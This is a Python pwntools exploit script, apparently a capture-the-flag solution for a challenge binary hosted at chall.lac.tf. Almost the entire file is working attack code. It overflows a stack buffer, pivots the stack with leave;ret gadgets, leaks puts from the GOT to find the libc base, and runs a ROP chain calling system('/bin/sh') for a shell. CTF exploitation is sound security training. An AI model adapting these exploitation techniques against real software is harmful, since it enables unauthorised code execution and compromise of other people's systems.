from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.lac.tf", 31137)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401387
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sl(b'1')

leave_ret = 0x0000000000401387
payload = b'a'*64
payload += p64(elf.got["exit"] + 0x40 + 0x40)
# payload += p64(0x0000000000404)
payload += p64(0x0000000000401252)
payload += p64(elf.sym['main'])
sl(payload)

sl(b'1')
payload = b'2'
# payload += p64(gad(elf, ['ret']))*0x100
payload += p64(0x0000000000404f68)
payload += p64(leave_ret)
payload += b'a'*0x30
payload += p64(0x0000000000404f48)
payload += p64(leave_ret)
payload += b'a'*(0xea0-8)
payload += p64(0x0000000000404f48)
payload += p64(elf.sym['main'])
payload += p64(0x0000000000404f78+0x40)*0x3

# payload += p64(gad(elf, ['ret']))
payload += p64(elf.sym['read_int'])
payload += p64(0x0000000000401243)
sl(payload)
sl(b'1')
sl(b'2')


sl(b'1')

payload = b'a'*0x40
payload += p64(elf.got["exit"] + 0x40)
payload += p64(0x0000000000401252)
sl(payload)

sl(b'1')

payload = b'2'
payload += p64(gad(elf, ['ret']))
payload += p64(gad(elf, ['ret']))
sl(payload)

sl(b'1')
sl(b'2')

sl(str(elf.got['puts']))
for i in range(4):
    ru("you got blown up by a creeper :(")
ru("2. Exit")
rl()
libc.address = uu64(6) - libc.sym['puts']
ic(hex(libc.address))


payload = p64(qgad(libc, 'rdi'))
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(gad(libc, ['ret']))
payload += p64(libc.sym['system'])
sl(payload)
# payload = b'2'
# payload += p64(gad(elf, ['ret']))
# payload += p64(elf.sym['main'])
# sl(payload)

io.interactive()
